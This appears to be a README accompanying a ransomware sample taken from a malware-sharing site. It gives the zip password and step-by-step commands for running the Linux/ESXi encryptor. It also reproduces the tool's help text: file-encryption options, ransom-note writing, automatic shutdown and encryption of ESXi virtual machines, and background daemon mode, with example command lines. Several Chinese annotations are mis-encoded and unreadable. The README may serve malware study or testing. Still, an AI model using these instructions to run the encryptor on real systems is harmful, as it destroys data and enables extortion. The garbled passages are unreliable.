## how to use

  Unzip Password : infected  
 
  then run :
`chmod +x filename`

`./filename -h` get help:

                Usage: ./66f86812a6593cdd760cd2119f8bf1a76f33a1b56ab099edc02de7b0629ea15d.elf [arguments]... [path1] [path2]...

                Arguments:
                -c[+/-]               - Change file name after encryption
                -w[+/-]               - Write note in each folder
                -p=count              - Percent of encryption (1..100)
                -e="newextension"     - custom Extension
                -x="externalnote.txt" - include note from eXternal file
                -e, --esxi            - automatic processing of ESXi: shutdown and encryption each machine
                -i=id, -i=id1,id2,... - Ignore vmid(s) (use with '-e' or '--esxi' keys;
                                        run 'vim-cmd vmsvc/getallvm' on ESXi-host to get vmids)
                -d, --daemon          - work as Daemon in background mode
                -l, --log             - write Log (in daemon mode, logging is enabled by default)
                -h, --help            - this Help

                Example:
                ./66f86812a6593cdd760cd2119f8bf1a76f33a1b56ab099edc02de7b0629ea15d.elf -e -i=999,666 -z- -c+ -w+ -p=5 -e="BEASTWASHERE" -x="README.TXT" /SOME/KIND/OF/FOLDER


���鲻ʹ��-e��-i�����ܻᱨ��vim-cmd is not available

"-e, --esxi: �����������Զ�����ESXi�Ĳ����������رղ�����ÿ̨�������

-i=id, -i=id1,id2,...: ���������ں���ָ�������id�Ĳ�����ͨ����-e��--esxiһ��ʹ�á�"

�磺

`./66f86812a6593cdd760cd2119f8bf1a76f33a1b56ab099edc02de7b0629ea15d.elf -z- -c+ -w+ -p=5 -e=��BEASTWASHERE�� -x=��README.TXT�� /home/lt/Downloads/randomware-master
`

����-p Ϊ���ܰٷֱȣ�������Ը���p��ֵ����ö�����ݣ��������ص�Ӱ��


malware get from https://bazaar.abuse.ch/sample/031971b9ccb57c1a7cf25bbd58533a6b1b1e760b2f080cb2be5e2522c0d90053/